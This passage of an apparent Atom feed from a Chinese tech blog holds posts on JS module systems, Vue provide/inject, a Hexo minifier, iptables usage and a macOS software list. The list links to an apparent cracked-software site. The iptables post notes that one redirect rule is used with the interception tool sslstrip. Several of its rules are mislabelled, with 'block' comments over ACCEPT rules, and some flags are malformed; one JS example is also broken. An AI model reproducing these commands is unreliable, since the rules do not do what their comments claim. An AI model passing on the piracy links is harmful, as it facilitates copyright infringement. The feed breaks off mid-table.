rel="noopener">传送门</a>。</p><h3 id="Feature"><a href="#Feature" class="headerlink" title="Feature"></a>Feature</h3><ol><li>初始化基础配置文件</li><li>初始化 <span class="highlight">eslint</span> + <span class="highlight">prettier</span> 相关配置</li><li>初始化完毕后执行 <code>yarn install</code></li></ol><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><ol><li>安装 <span class="highlight">cookiecutter</span></li></ol><pre><code class="lang-bash">$ pip install cookiecutter</code></pre><ol><li>使用模板</li></ol><pre><code class="lang-bash">$ cookiecutter gh:vincent0700/cookiecutter-jsproject_name [project_name]: demoauthor [vincent0700 (https://vincentstudio.info)]:email [wang.yuanqiu007@gmail.com]:description [say somthing]: a demo project</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Toolkit" scheme="https://vincentstudio.info/categories/Toolkit/"/>
    
    
      <category term="Python" scheme="https://vincentstudio.info/tags/Python/"/>
    
      <category term="FrontEnd" scheme="https://vincentstudio.info/tags/FrontEnd/"/>
    
  </entry>
  
  <entry>
    <title>前端模块化方式总结</title>
    <link href="https://vincentstudio.info/2020/01/14/036_Frontend_modular_ways/"/>
    <id>https://vincentstudio.info/2020/01/14/036_Frontend_modular_ways/</id>
    <published>2020-01-14T03:30:00.000Z</published>
    <updated>2020-01-30T08:29:43.749Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>本文旨在对前端模块化方式 <code>CommonJS</code>, <code>AMD</code>, <code>CMD</code>, <code>UMD</code>, <code>ES6 Module</code> 的大致使用方式、解决的问题以及特性进行归纳总结，方便以后查阅。</p></blockquote><h2 id="VanillaJs"><a href="#VanillaJs" class="headerlink" title="VanillaJs"></a>VanillaJs</h2><h3 id="IIFE-amp-闭包"><a href="#IIFE-amp-闭包" class="headerlink" title="IIFE &amp; 闭包"></a>IIFE &amp; 闭包</h3><pre><code class="lang-javascript">// people.jsvar people = (function() {  let name = &quot;Sophia&quot;;  let age = 12;  return {    getName: () =&gt; name,    getAge: () =&gt; age  };})();// invoke.jsconsole.log(people.getName());console.log(people.getAge());</code></pre><p>有了 <span class="highlight">namespace</span> 的概念，外部无法覆盖 <span class="highlight">name</span> 和 <span class="highlight">age</span>，但是 <span class="highlight">people</span> 依然是全局变量。</p><h3 id="改良"><a href="#改良" class="headerlink" title="改良"></a>改良</h3><pre><code class="lang-javascript">// people.js(function(window) {  let name = &quot;Sophia&quot;;  let age = 12;  return {    getName: () =&gt; name,    getAge: () =&gt; age,    say: () =&gt; say(name)  };})(window, say);// say.js(function(window) {  window.say = (name) =&gt; {    console.log(`Hello ${name}.`)  }})(window);</code></pre><pre><code class="lang-html">&lt;script src=&quot;./dance.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./people.js&quot;&gt;&lt;/script&gt;&lt;script&gt;  people.say();&lt;/script&gt;</code></pre><p>有了依赖的概念，但是依然没有解决全局变量的问题，而且模块引入顺序必须要靠人工维护。</p><h2 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h2><p>主要用于 <span class="highlight">NodeJs</span>，浏览器原生不支持，可通过 <span class="highlight">browserify</span> 或 <span class="highlight">webpack</span> 打包后在浏览器上跑。</p><pre><code class="lang-javascript">// people.jsconst { say } = require(&quot;./say.js&quot;);let name = &quot;Sophia&quot;;let age = 12;module.exports = {  getName: () =&gt; name,  getAge: () =&gt; age,  say: () =&gt; say(name)};// say.jsmodule.exports = {  say: (name) =&gt; {    console.log(`Hello ${name}.`);  }}// invoke.jsconst people = require(&quot;./people.js&quot;);people.say();</code></pre><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><ul><li>以文件为单元模块</li><li>同步加载模块</li><li>模块可以被加载多次，但只会在第一次执行，而后读取的是之前运行的缓存。</li><li>模块加载顺序和代码中的顺序一致</li><li>导出的值是拷贝</li></ul><h2 id="AMD-RequireJs"><a href="#AMD-RequireJs" class="headerlink" title="AMD / RequireJs"></a>AMD / RequireJs</h2><p><span class="highlight">AMD</span> (Asynchronous Module Definition) 顾名思义，主要解决模块的异步加载的问题。</p><pre><code class="lang-javascript">// people.jsdefine([&#39;./say.js&#39;], function({ say }) {  let name = &quot;Sophia&quot;;  let age = 12;  return {    getName: () =&gt; name,    getAge: () =&gt; age,    say: () =&gt; say(name)  };});</code></pre><h3 id="特性-1"><a href="#特性-1" class="headerlink" title="特性"></a>特性</h3><ul><li>异步加载</li><li>依赖前置</li></ul><h2 id="CMD-SeaJs"><a href="#CMD-SeaJs" class="headerlink" title="CMD / SeaJs"></a>CMD / SeaJs</h2><p><span class="highlight">CMD</span> (Common Module Definition) 通用模块定义，最早由阿里的大神玉伯提出。</p><pre><code class="lang-javascript">// people.jsdefine(function (requie, exports, module) {  const { say } = require(&#39;./say.js&#39;);  let name = &quot;Sophia&quot;;  let age = 12;  module.exports = {    getName: () =&gt; name,    getAge: () =&gt; age,    say: () =&gt; say(name)  };});</code></pre><h3 id="特性-2"><a href="#特性-2" class="headerlink" title="特性"></a>特性</h3><ul><li>相对自然的依赖声明风格</li><li>依赖就近 (<span class="highlight">RequireJs</span> 2.0+ 也加入此特性)</li></ul><h2 id="UMD"><a href="#UMD" class="headerlink" title="UMD"></a>UMD</h2><p><span class="highlight">UMD</span> (Universal module definition) 是 <span class="highlight">AMD</span> 和 <span class="highlight">CommonJS</span> 的综合的产物。<span class="highlight">AMD</span> 适用于浏览器，<span class="highlight">CommonJS</span> 用于 <span class="highlight">NodeJs</span> 服务端，为了解决模块跨平台问题，衍生出 <span class="highlight">UMD</span> 规范。其本质就是通过 <span class="highlight">if/else</span> 判断全局变量，然后决定如何加载。</p><pre><code class="lang-javascript">(function (window, factory) {    if (typeof exports === &#39;object&#39;) {        module.exports = factory();    } elseif (typeof define === &#39;function&#39; &amp;&amp; define.amd) {        define(factory);    } else {        window.eventUtil = factory();    }})(this, function () {    //module ...});</code></pre><h2 id="ES6-Module"><a href="#ES6-Module" class="headerlink" title="ES6 Module"></a>ES6 Module</h2><pre><code class="lang-javascript">// people.jsimport { say } from &quot;./say.js&quot;let name = &quot;Sophia&quot;;let age = 12;export default {  getName: () =&gt; name,  getAge: () =&gt; age,  say: () =&gt; say(name)};</code></pre><h3 id="特性-3"><a href="#特性-3" class="headerlink" title="特性"></a>特性</h3><ul><li>模块输出是值的引用，而 <span class="highlight">CommonJS</span> 是值的拷贝</li><li>静态语法，只能卸载顶层，而 <span class="highlight">CommonJS</span> 是动态语法，可以写在判断里</li><li>和 <span class="highlight">CommonJS</span> 一样，模块只会被加载一次，不同的是，<span class="highlight">import</span> 指向模块的引用，而 <span class="highlight">CommonJS</span> 加载的时候就会执行该脚本，然后内存中生成一个对象，而后只会返回会缓存的结果</li><li><span class="highlight">this</span> 是 <span class="highlight">undefined</span>，而 <span class="highlight">CommonJS</span> 是指向当前模块</li><li>无论模块内是否声明 <span class="highlight">use strict</span>，都采用严格模式</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincentstudio.info/categories/Tech/"/>
    
    
      <category term="FrontEnd" scheme="https://vincentstudio.info/tags/FrontEnd/"/>
    
      <category term="Javascript" scheme="https://vincentstudio.info/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>Vue 跨级访问祖先组件 (provide/inject)</title>
    <link href="https://vincentstudio.info/2020/01/13/035_Usage_of_provide_and_inject_in_vue/"/>
    <id>https://vincentstudio.info/2020/01/13/035_Usage_of_provide_and_inject_in_vue/</id>
    <published>2020-01-13T03:30:00.000Z</published>
    <updated>2020-01-30T08:29:43.762Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>在看 <code>Element</code> 面包屑组件的源码时记录</p></blockquote><h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>首先看一段 <code>Breadcrumb.vue</code> 的实现代码。</p><pre><code class="lang-vue">&lt;template&gt;  &lt;div class=&quot;el-breadcrumb&quot; aria-label=&quot;Breadcrumb&quot; role=&quot;navigation&quot;&gt;    &lt;slot&gt;&lt;/slot&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default {    name: &#39;ElBreadcrumb&#39;,    props: {      separator: {        type: String,        default: &#39;/&#39;      },      separatorClass: {        type: String,        default: &#39;&#39;      }    },    provide() {      return {        elBreadcrumb: this      };    },    mounted() {      const items = this.$el.querySelectorAll(&#39;.el-breadcrumb__item&#39;);      if (items.length) {        items[items.length - 1].setAttribute(&#39;aria-current&#39;, &#39;page&#39;);      }    }  };&lt;/script&gt;</code></pre><p>这里，<code>Breadcrumb</code> 直接把自己的 <code>this</code> 暴露给下级组件，然后注入到 <code>BreadcrumbItem</code> 组件中，以达到向子孙组件传递信息的目的，下面就来总结一下 <code>Vue</code> 中 <code>provide/inject</code> 的用法。</p><h2 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h2><ul><li><code class="api-param-key">provide</code><code class="api-param-value">Object | () =&gt; Object</code></li><li><code class="api-param-key">inject</code><code class="api-param-value">Array<string>| { [key: string]: string | Symbol | Object }</string></code></li></ul><h2 id="详细介绍"><a href="#详细介绍" class="headerlink" title="详细介绍"></a>详细介绍</h2><ol><li><p>Vue 2.2.0 新增，主要为高阶插件/组件库跨级访问祖先组件数据的方法，并不推荐直接用于应用程序代码中。</p></li><li><p><code>provide</code> 和 <code>inject</code> 绑定并不是可响应的。然而，如果你传入了一个可监听的对象，那么其对象的属性还是可响应的。</p></li><li><p><code>Symbol</code> 作为 <code>key</code></p></li></ol><pre><code class="lang-vue">const s = Symbol()const Provider = {  provide () {    return {      [s]: &#39;foo&#39;    }  }}const Child = {  inject: { s },  // ...}</code></pre><ol><li><code>inject</code> 作为 <code>props</code> 或 <code>data</code> 默认值，只在 <code>^2.2.1</code> 有效，以下版本注入值会在初始化之后得到。</li></ol><pre><code class="lang-vue">const Child = {  inject: [&#39;foo&#39;],  data () {    return {      bar: this.foo    }  }}</code></pre><ol><li>参数化配置，只在 <code>^2.5.0</code> 有效</li></ol><pre><code class="lang-vue">// 设置默认值const Child = {  inject: {    foo: { default: &#39;foo&#39; }  }}// 工厂方法设置默认值const Child = {  inject: {    foo: {      from: &#39;bar&#39;,      default: () =&gt; [1, 2, 3]    }  }}// 从不同名字的属性注入const Child = {  inject: {    foo: {      from: &#39;bar&#39;,      default: &#39;foo&#39;    }  }}</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a href="https://vuejs.bootcss.com/v2/api/#provide-inject" target="_blank" rel="noopener">Vue.js 中文文档</a></li><li><a href="https://github.com/ElemeFE/element/blob/dev/packages/breadcrumb/src/breadcrumb.vue" target="_blank" rel="noopener">Element 源码</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincentstudio.info/categories/Tech/"/>
    
    
      <category term="FrontEnd" scheme="https://vincentstudio.info/tags/FrontEnd/"/>
    
      <category term="Vue" scheme="https://vincentstudio.info/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>Hexo 资源压缩 | hexo-all-minifier</title>
    <link href="https://vincentstudio.info/2019/12/31/034_Usage_of_hexo-all-minifier_copy/"/>
    <id>https://vincentstudio.info/2019/12/31/034_Usage_of_hexo-all-minifier_copy/</id>
    <published>2019-12-31T04:33:00.000Z</published>
    <updated>2020-01-30T08:31:10.925Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/chenzhutian/hexo-all-minifier" target="_blank" rel="noopener">https://github.com/chenzhutian/hexo-all-minifier</a></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code class="lang-bash">$ npm install hexo-all-minifier --save</code></pre><h3 id="简单配置"><a href="#简单配置" class="headerlink" title="简单配置"></a>简单配置</h3><p>在 _config.yml 里添加</p><pre><code class="lang-yml">all_minifier: true</code></pre><h3 id="全部配置"><a href="#全部配置" class="headerlink" title="全部配置"></a>全部配置</h3><p>详细说明见 <a href="https://github.com/chenzhutian/hexo-all-minifier/blob/master/README.md" target="_blank" rel="noopener">README</a></p><pre><code class="lang-yml">html_minifier:  enable: true  ignore_error: false  exclude:css_minifier:  enable: true  exclude:    - &#39;*.min.css&#39;js_minifier:  enable: true  mangle: true  compress:  exclude:    - &#39;*.min.js&#39;js_concator:  enable: false  bundle_path: &#39;/js/bundle.js&#39;  front: false  silent: falseimage_minifier:  enable: true  interlaced: false  multipass: false  optimizationLevel: 2  pngquant: false  progressive: false</code></pre><h2 id="源码学习"><a href="#源码学习" class="headerlink" title="源码学习"></a>源码学习</h2><pre><code class="lang-javascript">// /node_modules/hexo-all-minifier/index.jsconst isEnabled = process.env.NODE_ENV !== &#39;development&#39;  &amp;&amp; (hexo.config.hasOwnProperty(&#39;all_minifier&#39;) === false ||   hexo.config.all_minifier === true);if (isEnabled) {  // ...}</code></pre><blockquote><p>由于压缩处理时间较长，开发时热更频繁，所以这里判断了环境变量，开发环境不启用压缩，也是挺人性化的，所以我们的 npm 脚本可以写成这样 <code>&quot;dev&quot;: &quot;NODE_ENV=development hexo s&quot;</code></p></blockquote><pre><code class="lang-javascript">// /node_modules/hexo-all-minifier/index.jsif (isEnabled) {  // HTML minifier  hexo.config.html_minifier = Object.assign({    enable: true,    exclude: [],    ignoreCustomComments: [/^\s*more/],    removeComments: true,    removeCommentsFromCDATA: true,    collapseWhitespace: true,    collapseBooleanAttributes: true,    removeEmptyAttributes: true,    minifyJS: true,    minifyCSS: true,    silent: false  }, hexo.config.html_minifier);  // Css minifier  hexo.config.css_minifier = Object.assign({    enable: true,    exclude: [&#39;*.min.css&#39;],    silent: false  }, hexo.config.css_minifier);  // Js minifier  hexo.config.js_minifier = Object.assign({    enable: true,    mangle: true,    output: {},    compress: {},    exclude: [&#39;*.min.js&#39;],    silent: false  }, hexo.config.js_minifier);  // Image minifier  hexo.config.image_minifier = Object.assign({    enable: true,    interlaced: false,    multipass: false,    optimizationLevel: 3,    pngquant: false,    progressive: false,    silent: false  }, hexo.config.image_minifier);  // Js concator  hexo.config.js_concator = Object.assign({    enable: false,    bundle_path: &#39;js/bundle.js&#39;,    front: false,    silent: false  }, hexo.config.js_concator);  hexo.extend.filter.register(&#39;after_render:html&#39;, require(&#39;./lib/optimizeHTML&#39;));  hexo.extend.filter.register(&#39;after_render:css&#39;, require(&#39;./lib/optimizeCSS&#39;));  hexo.extend.filter.register(&#39;after_render:js&#39;, require(&#39;./lib/optimizeJS&#39;));  hexo.extend.filter.register(&#39;after_generate&#39;, require(&#39;./lib/optimizeImage&#39;));  hexo.extend.filter.register(&#39;after_generate&#39;, require(&#39;./lib/concatJS&#39;));}</code></pre><blockquote><p>这里初始化了一些默认的配置项，然后注册了一些渲染后钩子函数，处理函数在 <code>./lib</code> 文件夹下。</p><ul><li>optimizeHTML 依赖 <code>html-minifier</code></li><li>optimizeCSS 依赖 <code>clean-css</code></li><li>optimizeJS 依赖 <code>uglify-es</code></li><li>optimizeImage 依赖 <code>imagemin</code></li></ul></blockquote><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><ol><li>图片压缩报错</li></ol><pre><code class="lang-bash"># Hint$ Error: spawn /.../node_modules/jpegtran-bin/vendor/jpegtran ENOENT# 解决方案# Reference: https://github.com/imagemin/imagemin/issues/154$ yarn add -D jpegtran-bin</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Toolkit" scheme="https://vincentstudio.info/categories/Toolkit/"/>
    
    
      <category term="Hexo" scheme="https://vincentstudio.info/tags/Hexo/"/>
    
      <category term="FrontEnd" scheme="https://vincentstudio.info/tags/FrontEnd/"/>
    
  </entry>
  
  <entry>
    <title>iptables 简介</title>
    <link href="https://vincentstudio.info/2019/06/16/033_Port_Forwarding_Tutorial/"/>
    <id>https://vincentstudio.info/2019/06/16/033_Port_Forwarding_Tutorial/</id>
    <published>2019-06-16T06:00:00.000Z</published>
    <updated>2020-01-30T08:31:10.925Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>说道端口转发大家一定不陌生，路由器上经常操作端口映射，把内网端口映射到路由器端口，从而通过路由器的公网 IP 便可以访问内网端口。这一切归功于 iptables，当然 iptables 除了做端口转发，还有非常多的其他功能，本文就来详细介绍一下 iptables，并提供一些常用案例。</p></blockquote><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>iptables</code> 是一种 IP 信息包过滤系统，包含4个表，5个链。其中表是按照对数据包的操作区分的，链是按照不同的Hook点来区分的，具体包含关系为 <code>iptables</code> -&gt; <code>Tables</code> -&gt; <code>Chains</code> -&gt; <code>Rules</code>。其实 iptables 不是真正的防火墙，我们可以把它理解成一个客户端代理，用户通过 <code>iptables</code> 这个代理，将用户的安全设定执行到对应的”安全框架”中，这个”安全框架”才是真正的防火墙，这个框架的名字叫 <code>netfilter</code>。</p><h3 id="四个表"><a href="#四个表" class="headerlink" title="四个表"></a>四个表</h3><ul><li><code>FILTTER</code>：一般的过滤功能</li><li><code>NAT</code>：用于nat功能（端口映射，地址映射等）</li><li><code>MANGLE</code>：用于对特定数据包的修改</li><li><code>RAW</code>：优先级最高，设置raw时一般是为了不再让iptables做数据包的链接跟踪处理，提高性能</li></ul><h3 id="五个链"><a href="#五个链" class="headerlink" title="五个链"></a>五个链</h3><ul><li><code>PREROUTING</code>：数据包进入路由表之前</li><li><code>INPUT</code>：通过路由表后目的地为本机</li><li><code>FORWARD</code>：通过路由表后，目的地不为本机</li><li><code>OUTPUT</code>：由本机产生，向外转发</li><li><code>POSTROUTIONG</code>：发送到网卡接口之前</li></ul><h3 id="包含关系"><a href="#包含关系" class="headerlink" title="包含关系"></a>包含关系</h3><img src="/2019/06/16/033_Port_Forwarding_Tutorial/relationships.png"><h3 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图"></a>数据流图</h3><img src="/2019/06/16/033_Port_Forwarding_Tutorial/workflow.png"><h2 id="实用案例"><a href="#实用案例" class="headerlink" title="实用案例"></a>实用案例</h2><h3 id="开始、停止、重启-iptables-服务"><a href="#开始、停止、重启-iptables-服务" class="headerlink" title="开始、停止、重启 iptables 服务"></a>开始、停止、重启 iptables 服务</h3><pre><code class="lang-bash">$ systemctl start iptables$ systemctl stop iptables$ systemctl restart iptables</code></pre><h3 id="查看所有规则"><a href="#查看所有规则" class="headerlink" title="查看所有规则"></a>查看所有规则</h3><pre><code class="lang-bash">$ iptables -L -n -v# 具体看某个表的规则，如 nat$ iptables -t nat -L -n -v</code></pre><ul><li><code>-L</code> list，列举规则</li><li><code>-n</code> numeric，显示ip地址</li><li><code>-v</code> verbose，详细输出</li></ul><h3 id="清空所有规则"><a href="#清空所有规则" class="headerlink" title="清空所有规则"></a>清空所有规则</h3><pre><code class="lang-bash"># 清除默认 FILTER 链$ iptables -F# 清除 nat 表中的所有链$ iptables -t nat -F</code></pre><ul><li><code>-F</code> flush，清空规则</li></ul><h3 id="保存、恢复-iptables"><a href="#保存、恢复-iptables" class="headerlink" title="保存、恢复 iptables"></a>保存、恢复 iptables</h3><pre><code class="lang-bash"># 保存 iptables 规则到文件$ iptables-save &gt; ~/iptables.rules# 从文件恢复 iptables 规则$ iptables-restore &lt; ~/iptables.rules</code></pre><h3 id="屏蔽某个IP地址"><a href="#屏蔽某个IP地址" class="headerlink" title="屏蔽某个IP地址"></a>屏蔽某个IP地址</h3><pre><code class="lang-bash">$ iptables -A INPUT -s xxx.xxx.xxx.xxx -j DROP</code></pre><p>如果你想取消屏蔽</p><pre><code class="lang-bash">$ iptables -D INPUT -s xxx.xxx.xxx.xxx -j DROP</code></pre><p>如果只是想屏蔽 tcp 流量</p><pre><code class="lang-bash">$ iptables -A INPUT -p tcp -s xxx.xxx.xxx.xxx -j DROP</code></pre><ul><li><code>-A [chain]</code> append，增加规则</li><li><code>-D [chain]</code> delete，删除规则</li><li><code>-s [address/mask[...]]</code> source，源地址</li><li><code>-j [target]</code> jump，处理动作</li><li><code>-p [proto]</code> protocol，协议，<code>icmp</code>、<code>tcp</code>、<code>udp</code> 等</li></ul><h3 id="屏蔽某个端口"><a href="#屏蔽某个端口" class="headerlink" title="屏蔽某个端口"></a>屏蔽某个端口</h3><pre><code class="lang-bash"># 屏蔽从8080端口传出的连接$ iptables -A OUTPUT -p tcp --dport 8080 -j DROP# 屏蔽传入8080端口的连接$ iptables -A INPUT -p tcp --dport 8080 -j ACCEPT# 屏蔽多个端口的$ iptables -A INPUT  -p tcp -m multiport --dports 22,80,443 -j ACCEPT$ iptables -A OUTPUT -p tcp -m multiport --sports 22,80,443 -j ACCEPT</code></pre><h3 id="屏蔽某个MAC地址"><a href="#屏蔽某个MAC地址" class="headerlink" title="屏蔽某个MAC地址"></a>屏蔽某个MAC地址</h3><pre><code class="lang-bash">$ iptables -A INPUT -m mac --mac-source 00:00:00:00:00:00 -j DROP</code></pre><h3 id="设置端口转发"><a href="#设置端口转发" class="headerlink" title="设置端口转发"></a>设置端口转发</h3><pre><code class="lang-bash"># 设置允许转发 $ echo 1 &gt; /proc/sys/net/ipv4/ip_forward# 发往本地 80 端口的流量转发到本地 10000 端口（sslstrip 常用）$ iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port 10000# 在主机 A 上设置，访问[ip_a]:[port_a] 就相当于访问 [ip_b]:[port_b]，[ip_a] 不能是 lo 地址$ iptables -t nat -A PREROUTING -d [ip_a] -p tcp --dport [port_a] -j DNAT --to-destination [ip_b]:[port_b] $ iptables -t nat -A POSTROUTING -d [ip_b] -p tcp --dport [port_b] -j SNAT --to-source [ip_a]</code></pre><ul><li><code>-i [interface]</code> 网卡名</li></ul><h3 id="禁止-Ping，即屏蔽-ICMP-协议"><a href="#禁止-Ping，即屏蔽-ICMP-协议" class="headerlink" title="禁止 Ping，即屏蔽 ICMP 协议"></a>禁止 Ping，即屏蔽 ICMP 协议</h3><pre><code class="lang-bash">$ iptables -A INPUT -p icmp -i eth0 -j DROP</code></pre><h3 id="限制连接数"><a href="#限制连接数" class="headerlink" title="限制连接数"></a>限制连接数</h3><pre><code class="lang-bash"># 限制端口的连接数$ iptables -A INPUT -p tcp --dport 80 -m limit --limit 100/minute --limit-burst 200 -j ACCEPT# 限制并发的连接数，例如允许每个客户端最多建立3个ssh连接$ iptables -A INPUT -p tcp --syn --dport 22 -m connlimit --connlimit-above 3 -j REJECT</code></pre><ul><li><code>--limit 100/minute</code> 传入连接限制为100个每分钟</li><li><code>--limit-burst 200</code> 仅当连接总数达到200个以后才开始限制连接数</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Toolkit" scheme="https://vincentstudio.info/categories/Toolkit/"/>
    
    
      <category term="Linux" scheme="https://vincentstudio.info/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>MacOS 自用软件收藏清单（附下载链接）</title>
    <link href="https://vincentstudio.info/2019/06/15/032_OSX_Cracked_Software_Resources/"/>
    <id>https://vincentstudio.info/2019/06/15/032_OSX_Cracked_Software_Resources/</id>
    <published>2019-06-15T14:00:00.000Z</published>
    <updated>2020-01-30T08:31:10.925Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>本文收录了自己在 MacOS 上常用的软件，附有第三方下载页面链接，如果链接崩了请在下方留言告知，也欢迎大家分享补充。</p></blockquote><h2 id="效率工具"><a href="#效率工具" class="headerlink" title="效率工具"></a>效率工具</h2><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th><th>实用程度</th><th>下载连接</th></tr></thead><tbody><tr><td>Alfred</td><td>Spotlight终极加强版，效率神器不解释</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/alfred.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Things</td><td>时间管理，任务管理</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/things.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Fantastical</td><td>优雅的日历软件，非常好用</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/fantastical.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Karabiner-Elements</td><td>改键神器</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/karabiner-elements.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Unclutter</td><td>剪贴板工具，也可以临时记记笔记，很实用</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/unclutter.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Paste</td><td>剪贴板管理，支持回溯、分类，界面很酷炫</td><td><span style="font-size:20px;line-height:20px">★★★★☆</span></td><td><a href="https://xclient.info/s/paste-for-mac.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Vanilla</td><td>菜单栏图标管理</td><td><span style="font-size:20px;line-height:20px">★★★★☆</span></td><td><a href="https://xclient.info/s/vanilla.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Übersicht</td><td>桌面自定义React小部件</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href="https://github.com/felixhageloh/uebersicht" target="_blank" rel="noopener">Download</a></td></tr></tbody></table></div><h2 id="系统工具"><a href="#系统工具" class="headerlink" title="系统工具"></a>系统工具</h2><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th><th>实用程度</th><th>下载连接</th></tr></thead><tbody><tr><td>CleanMyMac</td><td>强大酷炫的系统清理工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/cleanmymac.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>App Cleaner</td><td>软件清理工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/app-cleaner-uninstaller-pro.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Parallels Desktop</td><td>虚拟机解决方案</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/parallels-desktop.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>balenaEtcher</td><td>启动盘制作工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://github.com/balena-io/etcher/releases" target="_blank" rel="noopener">Download</a></td></tr><tr><td>iStat Menus</td><td>炫酷的系统监控工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/istat-menus-for-mac.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Snagit</td><td>强大的截屏软件</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/snagit.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Free Download Manager</td><td>多线程下载工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://www.freedownloadmanager.org/zh/" target="_blank" rel="noopener">Download</a></td></tr><tr><td>TeamViewer</td><td>远程控制</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href="https://xclient.info/s/teamviewer.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Transmit</td><td>FTP客户端</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href="https://xclient.info/s/transmit.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>WiFi Scanner</td><td>无线网络扫描管理工具</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href="https://xclient.info/s/wifi-scanner.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Gas Mask</td><td>系统 hosts 文件修改器</td><td><span style="font-size:20px;line-height:20px">★★★</span></td><td><a 